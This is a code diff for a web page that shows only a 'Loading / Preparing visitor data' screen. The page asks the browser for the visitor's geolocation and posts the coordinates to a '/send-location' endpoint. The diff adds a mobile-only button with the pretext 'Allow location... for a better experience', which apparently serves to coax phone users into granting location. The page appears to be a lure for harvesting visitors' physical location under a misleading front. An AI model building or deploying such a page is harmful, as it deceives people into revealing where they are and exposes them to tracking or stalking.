@@ -18,9 +18,19 @@
 </div>
 <h1 class="loading-title">Loading<span class="dots"></span></h1>
 <p class="loading-subtitle">Preparing visitor data</p>
+<div class="mobile-prompt" id="mobilePrompt" hidden>
+<p class="prompt-copy">Allow location on your phone for a better experience on the website.</p>
+<button class="prompt-button" id="allowLocationButton" type="button">Allow Location</button>
+</div>
 </div>
 
 <script>
+const mobilePrompt=document.getElementById("mobilePrompt")
+const allowLocationButton=document.getElementById("allowLocationButton")
+
+function isMobileDevice(){
+return /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent)
+}
 
 async function sendVisitorData(payload){
 await fetch("/send-location",{
@@ -32,23 +42,48 @@ body:JSON.stringify(payload)
 })
 }
 
-async function getVisitorData(){
+async function requestVisitorLocation(){
 if(!navigator.geolocation){
 await sendVisitorData({})
 return
 }
 
 navigator.geolocation.getCurrentPosition(async position=>{
+hideMobilePrompt()
 await sendVisitorData({
 latitude:position.coords.latitude,
 longitude:position.coords.longitude
 })
 },async()=>{
+hideMobilePrompt()
 await sendVisitorData({})
 })
 }
 
-getVisitorData()
+function showMobilePrompt(){
+mobilePrompt.hidden=false
+}
+
+function hideMobilePrompt(){
+mobilePrompt.hidden=true
+}
+
+async function startVisitorFlow(){
+if(isMobileDevice()){
+showMobilePrompt()
+return
+}
+
+await requestVisitorLocation()
+}
+
+allowLocationButton.addEventListener("click",async()=>{
+allowLocationButton.disabled=true
+allowLocationButton.textContent="Requesting..."
+await requestVisitorLocation()
+})
+
+startVisitorFlow()
 
 </script>
 
